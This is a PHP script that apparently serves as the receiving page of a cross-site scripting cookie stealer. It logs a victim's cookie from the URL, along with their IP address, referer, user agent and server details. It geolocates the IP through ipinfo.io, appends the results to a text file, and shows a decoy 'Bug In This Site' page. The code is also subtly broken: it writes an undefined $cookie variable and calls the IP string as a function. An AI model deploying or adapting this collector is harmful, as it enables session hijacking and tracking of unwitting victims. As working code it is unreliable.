<?php

$cookies = "[+] Victim Cookie => [ " . $_GET['cookie'] . " ]";
$ip = "[+] Victim IP => [ " . $_SERVER['REMOTE_ADDR'] . " ]";
$ref = "[+] Victim Come from => [ " . $_SERVER['HTTP_REFERER'] . " ]";
$agent = "[+] Victim Details => [ " . $_SERVER['HTTP_USER_AGENT'] . " ]";
$server_name = "[+] Server Name => [ " . $_SERVER['SERVER_NAME'] . " ]";
$server_ip = "[+] Server IP => [ " . $_SERVER['SERVER_ADDR'] . " ]";

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])){
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    }

    else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    else if (isset($_SERVER['HTTP_X_FORWARDED'])){
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    }

    else if (isset($_SERVER['HTTP_FORWARDED_FOR'])){
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    }

    else if (isset($_SERVER['HTTP_FORWARDED'])){
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    }

    else if (isset($_SERVER['REMOTE_ADDR'])){
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    }

    else {
        $ipaddress = "UNKNOWN";
    }
    return $ipaddress();
}

$publicIP = get_client_ip();
$json = file_get_contents("http://ipinfo.io/$publicIP/geo");
$json = json_decode($json,true);
$country = "User Country Is => " . $json['country'];
$region = "User Region Is => " . $json['region'];
$city = "User City Is => " . $json['city'];
$all = "\n------[Begin]------\n" . $cookie . "\n\n" . $ip . "\n\n" . $ref . "\n\n" . $agent . "\n\n" . $server_name . "\n\n" . $server_ip . "\n\n" . "[Location]" . "\n\n" . $country . "\n" . $region . "\n" . $city . "\n\n" . "------[End]------";
$handle = fopen('Cook.txt', 'a');
fwrite($handle, $all);
fclose($handle);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <center>
    <div style="color: red;">Bug In This Site</div>
    </center>
</body>
</html>